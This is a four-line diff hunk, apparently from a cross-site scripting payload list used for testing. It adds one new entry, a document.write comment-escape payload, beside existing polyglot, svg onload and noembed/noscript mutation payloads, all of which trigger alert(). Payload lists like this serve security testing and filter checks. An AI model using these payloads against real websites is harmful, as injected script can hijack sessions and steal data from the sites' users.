@@ -1700,3 +1700,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 </script><svg>"-alert(3)//
 <noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
 <noscript><img src="</noscript><iframe onload=alert(1)>" /></noscript>
+<script>document.write('<script>/*');</script>*/alert(1)</script>
